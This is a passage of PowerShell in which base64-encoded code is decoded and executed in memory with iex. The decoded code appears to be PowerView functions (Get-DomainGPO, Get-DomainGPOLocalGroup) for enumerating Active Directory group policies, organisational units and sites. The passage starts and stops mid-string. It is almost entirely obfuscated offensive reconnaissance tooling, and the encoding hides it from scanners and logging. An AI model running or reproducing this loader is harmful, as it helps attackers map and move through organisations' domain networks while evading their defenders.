AgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydQcm9wZXJ0aWVzJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydQcm9wZXJ0aWVzJ10gPSAkUHJvcGVydGllcyB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWN1cml0eU1hc2tzJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydTZWN1cml0eU1hc2tzJ10gPSAkU2VjdXJpdHlNYXNrcyB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAkR1BPU2VhcmNoZXIgPSBHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCiAgICB9CiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJEdQT1NlYXJjaGVyKSB7CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVySWRlbnRpdHknXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VySWRlbnRpdHknXSkgewogICAgICAgICAgICAgICAgJEdQT0Fkc1BhdGhzID0gQCgpCiAgICAgICAgICAgICAgICBpZiAoJFNlYXJjaGVyQXJndW1lbnRzWydQcm9wZXJ0aWVzJ10pIHsKICAgICAgICAgICAgICAgICAgICAkT2xkUHJvcGVydGllcyA9ICRTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ1Byb3BlcnRpZXMnXSA9ICdkaXN0aW5ndWlzaGVkbmFtZSxkbnNob3N0bmFtZScKICAgICAgICAgICAgICAgICRUYXJnZXRDb21wdXRlck5hbWUgPSAkTnVsbAogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJJZGVudGl0eSddKSB7CiAgICAgICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJENvbXB1dGVySWRlbnRpdHkKICAgICAgICAgICAgICAgICAgICAkQ29tcHV0ZXIgPSBHZXQtRG9tYWluQ29tcHV0ZXIgQFNlYXJjaGVyQXJndW1lbnRzIC1GaW5kT25lIHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMQogICAgICAgICAgICAgICAgICAgIGlmKC1ub3QgJENvbXB1dGVyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR1BPXSBDb21wdXRlciAnJENvbXB1dGVySWRlbnRpdHknIG5vdCBmb3VuZCEiCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICRPYmplY3RETiA9ICRDb21wdXRlci5kaXN0aW5ndWlzaGVkbmFtZQogICAgICAgICAgICAgICAgICAgICRUYXJnZXRDb21wdXRlck5hbWUgPSAkQ29tcHV0ZXIuZG5zaG9zdG5hbWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRVc2VySWRlbnRpdHkKICAgICAgICAgICAgICAgICAgICAkVXNlciA9IEdldC1Eb21haW5Vc2VyIEBTZWFyY2hlckFyZ3VtZW50cyAtRmluZE9uZSB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEKICAgICAgICAgICAgICAgICAgICBpZigtbm90ICRVc2VyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR1BPXSBVc2VyICckVXNlcklkZW50aXR5JyBub3QgZm91bmQhIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkT2JqZWN0RE4gPSAkVXNlci5kaXN0aW5ndWlzaGVkbmFtZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJE9iamVjdE9VcyA9IEAoKQogICAgICAgICAgICAgICAgJE9iamVjdE9VcyArPSAkT2JqZWN0RE4uc3BsaXQoJywnKSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICBpZigkXy5zdGFydHN3aXRoKCdPVT0nKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkT2JqZWN0RE4uU3ViU3RyaW5nKCRPYmplY3RETi5JbmRleE9mKCIkKCRfKSwiKSkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdQT10gb2JqZWN0IE9VczogJE9iamVjdE9VcyIKICAgICAgICAgICAgICAgIGlmICgkT2JqZWN0T1VzKSB7CiAgICAgICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzLlJlbW92ZSgnUHJvcGVydGllcycpCiAgICAgICAgICAgICAgICAgICAgJEluaGVyaXRhbmNlRGlzYWJsZWQgPSAkRmFsc2UKICAgICAgICAgICAgICAgICAgICBGb3JFYWNoKCRPYmplY3RPVSBpbiAkT2JqZWN0T1VzKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRPYmplY3RPVQogICAgICAgICAgICAgICAgICAgICAgICAkR1BPQWRzUGF0aHMgKz0gR2V0LURvbWFpbk9VIEBTZWFyY2hlckFyZ3VtZW50cyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkXy5ncGxpbmspIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkXy5ncGxpbmsuc3BsaXQoJ11bJykgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkXy5zdGFydHN3aXRoKCdMREFQJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRQYXJ0cyA9ICRfLnNwbGl0KCc7JykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcG9ETiA9ICRQYXJ0c1swXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEVuZm9yY2VkID0gJFBhcnRzWzFdCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJEluaGVyaXRhbmNlRGlzYWJsZWQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJEVuZm9yY2VkIC1lcSAyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcG9ETgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcG9ETgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRfLmdwb3B0aW9ucyAtZXEgMSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJbmhlcml0YW5jZURpc2FibGVkID0gJFRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmICgkVGFyZ2V0Q29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgICAgICAgICAgJENvbXB1dGVyU2l0ZSA9IChHZXQtTmV0Q29tcHV0ZXJTaXRlTmFtZSAtQ29tcHV0ZXJOYW1lICRUYXJnZXRDb21wdXRlck5hbWUpLlNpdGVOYW1lCiAgICAgICAgICAgICAgICAgICAgaWYoJENvbXB1dGVyU2l0ZSAtYW5kICgkQ29tcHV0ZXJTaXRlIC1ub3RsaWtlICdFcnJvcionKSkgewogICAgICAgICAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0lkZW50aXR5J10gPSAkQ29tcHV0ZXJTaXRlCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9BZHNQYXRocyArPSBHZXQtRG9tYWluU2l0ZSBAU2VhcmNoZXJBcmd1bWVudHMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkXy5ncGxpbmspIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkXy5ncGxpbmsuc3BsaXQoJ11bJykgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkXy5zdGFydHN3aXRoKCdMREFQJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfLnNwbGl0KCc7JylbMF0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRPYmplY3REb21haW5ETiA9ICRPYmplY3RETi5TdWJTdHJpbmcoJE9iamVjdEROLkluZGV4T2YoJ0RDPScpKQogICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzLlJlbW92ZSgnSWRlbnRpdHknKQogICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzLlJlbW92ZSgnUHJvcGVydGllcycpCiAgICAgICAgICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICIob2JqZWN0Y2xhc3M9ZG9tYWluKShkaXN0aW5ndWlzaGVkbmFtZT0kT2JqZWN0RG9tYWluRE4pIgogICAgICAgICAgICAgICAgJEdQT0Fkc1BhdGhzICs9IEdldC1Eb21haW5PYmplY3QgQFNlYXJjaGVyQXJndW1lbnRzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgIGlmKCRfLmdwbGluaykgewogICAgICAgICAgICAgICAgICAgICAgICAkXy5ncGxpbmsuc3BsaXQoJ11bJykgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJF8uc3RhcnRzd2l0aCgnTERBUCcpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJF8uc3BsaXQoJzsnKVswXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5HUE9dIEdQT0Fkc1BhdGhzOiAkR1BPQWRzUGF0aHMiCiAgICAgICAgICAgICAgICBpZiAoJE9sZFByb3BlcnRpZXMpIHsgJFNlYXJjaGVyQXJndW1lbnRzWydQcm9wZXJ0aWVzJ10gPSAkT2xkUHJvcGVydGllcyB9CiAgICAgICAgICAgICAgICBlbHNlIHsgJFNlYXJjaGVyQXJndW1lbnRzLlJlbW92ZSgnUHJvcGVydGllcycpIH0KICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50cy5SZW1vdmUoJ0lkZW50aXR5JykKICAgICAgICAgICAgICAgICRHUE9BZHNQYXRocyB8IFdoZXJlLU9iamVjdCB7JF8gLWFuZCAoJF8gLW5lICcnKX0gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkXwogICAgICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gIihvYmplY3RDYXRlZ29yeT1ncm91cFBvbGljeUNvbnRhaW5lcikiCiAgICAgICAgICAgICAgICAgICAgR2V0LURvbWFpbk9iamVjdCBAU2VhcmNoZXJBcmd1bWVudHMgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1JhdyddKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkXy5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuR1BPLlJhdycpCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkXy5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuR1BPJykKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkXwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciA9ICcnCiAgICAgICAgICAgICAgICAkRmlsdGVyID0gJycKICAgICAgICAgICAgICAgICRJZGVudGl0eSB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUluc3RhbmNlID0gJF8uUmVwbGFjZSgnKCcsICdcMjgnKS5SZXBsYWNlKCcpJywgJ1wyOScpCiAgICAgICAgICAgICAgICAgICAgaWYgKCRJZGVudGl0eUluc3RhbmNlIC1tYXRjaCAnTERBUDovL3xeQ049LionKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKSIKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCgtbm90ICRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIC1hbmQgKC1ub3QgJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlEb21haW4gPSAkSWRlbnRpdHlJbnN0YW5jZS5TdWJTdHJpbmcoJElkZW50aXR5SW5zdGFuY2UuSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR1BPXSBFeHRyYWN0ZWQgZG9tYWluICckSWRlbnRpdHlEb21haW4nIGZyb20gJyRJZGVudGl0eUluc3RhbmNlJyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkSWRlbnRpdHlEb21haW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHUE9TZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgtbm90ICRHUE9TZWFyY2hlcikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtRG9tYWluR1BPXSBVbmFibGUgdG8gcmV0cmlldmUgZG9tYWluIHNlYXJjaGVyIGZvciAnJElkZW50aXR5RG9tYWluJyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCRJZGVudGl0eUluc3RhbmNlIC1tYXRjaCAney4qfScpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIobmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkiCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEd1aWRCeXRlU3RyaW5nID0gKC1Kb2luICgoW0d1aWRdJElkZW50aXR5SW5zdGFuY2UpLlRvQnl0ZUFycmF5KCkgfCBGb3JFYWNoLU9iamVjdCB7JF8uVG9TdHJpbmcoJ1gnKS5QYWRMZWZ0KDIsJzAnKX0pKSAtUmVwbGFjZSAnKC4uKScsJ1wkMScKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKSIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihkaXNwbGF5bmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkiCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoJElkZW50aXR5RmlsdGVyIC1hbmQgKCRJZGVudGl0eUZpbHRlci5UcmltKCkgLW5lICcnKSApIHsKICAgICAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIofCRJZGVudGl0eUZpbHRlcikiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydMREFQRmlsdGVyJ10pIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdQT10gVXNpbmcgYWRkaXRpb25hbCBMREFQIGZpbHRlcjogJExEQVBGaWx0ZXIiCiAgICAgICAgICAgICAgICAgICAgJEZpbHRlciArPSAiJExEQVBGaWx0ZXIiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkR1BPU2VhcmNoZXIuZmlsdGVyID0gIigmKG9iamVjdENhdGVnb3J5PWdyb3VwUG9saWN5Q29udGFpbmVyKSRGaWx0ZXIpIgogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5HUE9dIGZpbHRlciBzdHJpbmc6ICQoJEdQT1NlYXJjaGVyLmZpbHRlcikiCiAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydGaW5kT25lJ10pIHsgJFJlc3VsdHMgPSAkR1BPU2VhcmNoZXIuRmluZE9uZSgpIH0KICAgICAgICAgICAgICAgIGVsc2UgeyAkUmVzdWx0cyA9ICRHUE9TZWFyY2hlci5GaW5kQWxsKCkgfQogICAgICAgICAgICAgICAgJFJlc3VsdHMgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSYXcnXSkgewogICAgICAgICAgICAgICAgICAgICAgICAkR1BPID0gJF8KICAgICAgICAgICAgICAgICAgICAgICAgJEdQTy5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuR1BPLlJhdycpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10gLWFuZCAoJFNlYXJjaEJhc2UgLU1hdGNoICdeR0M6Ly8nKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdQTyA9IENvbnZlcnQtTERBUFByb3BlcnR5IC1Qcm9wZXJ0aWVzICRfLlByb3BlcnRpZXMKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0ROID0gJEdQTy5kaXN0aW5ndWlzaGVkbmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Eb21haW4gPSAkR1BPRE4uU3ViU3RyaW5nKCRHUE9ETi5JbmRleE9mKCdEQz0nKSkgLXJlcGxhY2UgJ0RDPScsJycgLXJlcGxhY2UgJywnLCcuJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRncGNmaWxlc3lzcGF0aCA9ICJcXCRHUE9Eb21haW5cU3lzVm9sXCRHUE9Eb21haW5cUG9saWNpZXNcJCgkR1BPLmNuKSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR1BPIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ2dwY2ZpbGVzeXNwYXRoJyAkZ3BjZmlsZXN5c3BhdGgKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdQT10gRXJyb3IgY2FsY3VsYXRpbmcgZ3BjZmlsZXN5c3BhdGggZm9yOiAkKCRHUE8uZGlzdGluZ3Vpc2hlZG5hbWUpIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdQTyA9IENvbnZlcnQtTERBUFByb3BlcnR5IC1Qcm9wZXJ0aWVzICRfLlByb3BlcnRpZXMKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkR1BPLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5HUE8nKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkR1BPCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoJFJlc3VsdHMpIHsKICAgICAgICAgICAgICAgICAgICB0cnkgeyAkUmVzdWx0cy5kaXNwb3NlKCkgfQogICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5HUE9dIEVycm9yIGRpc3Bvc2luZyBvZiB0aGUgUmVzdWx0cyBvYmplY3Q6ICRfIgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRHUE9TZWFyY2hlci5kaXNwb3NlKCkKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbkdQT0xvY2FsR3JvdXAgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuR1BPR3JvdXAnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0Rpc3Rpbmd1aXNoZWROYW1lJywgJ1NhbUFjY291bnROYW1lJywgJ05hbWUnKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJElkZW50aXR5LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFJlc29sdmVNZW1iZXJzVG9TSURzLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIEJFR0lOIHsKICAgICAgICAkU2VhcmNoZXJBcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snTERBUEZpbHRlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJFNlYXJjaEJhc2UgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Nlc